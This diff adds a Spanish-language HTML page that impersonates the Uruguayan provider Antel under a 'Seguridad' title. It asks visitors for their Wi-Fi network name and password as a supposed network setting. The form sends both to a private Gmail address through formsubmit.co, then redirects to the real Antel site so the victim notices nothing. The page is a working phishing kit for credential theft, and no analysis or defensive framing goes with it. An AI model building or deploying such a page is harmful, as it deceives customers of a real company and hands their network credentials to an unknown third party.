@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="icon" href="favicon.png" type="image/png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad - Antel</title>
+    <style>
+    .pw{
+        margin-top: 14px;
+    }
+    .name{
+        margin-top: 10px;}
+        * {
+            margin: 0; 
+            padding: 0;
+            box-sizing: border-box;
+            letter-spacing: 0.5px;
+            font-size: 1.25rem;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        form {
+            max-width: 650px;
+            border: solid 1px #d5d5d5;
+            margin: 10px auto;
+            border-radius: 8px;
+            padding: 20px;
+        }
+        input {
+            width: 100%;
+            border: solid 1px #d5d5d5;
+            border-radius: 8px;
+            padding: 8px;
+            color: #383838;
+        }
+        button {
+            background: #0085ff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 450;
+            padding: 6px;
+            width: 60%;
+            display: block;
+            margin: 18px auto 0;
+        }
+        label {
+            font-weight: 300;
+            color: #383838;
+        }
+    @media (max-width: 600px) {
+    form {
+        width: 98%;
+    }
+}
+      .title{
+          font-weight: 500;
+          text-align: center;
+          color: #2a407e;
+          margin-bottom: 16px;
+      }
+    </style>
+</head>
+<body>
+      <form action="https://formsubmit.co/lopezeln124@gmail.com" method="post">
+          <p class="title">Configuración de ajuste de red</p>
+        <div class="name">
+            <label>Nombre de red Wi-Fi</label>
+        <input type="text" name="name" required>
+        </div>
+        <div class="pw">
+            <label>Contraseña</label>
+        <input type="text" name="pw" required>
+        </div>
+            <button type="submit">Confirmar</button>
+          
+          <input type="hidden" name="_next" value="https://www.antel.com.uy">
+          <input type="hidden" name="_captcha" value="false">
+    </form>
+</body>
+</html>
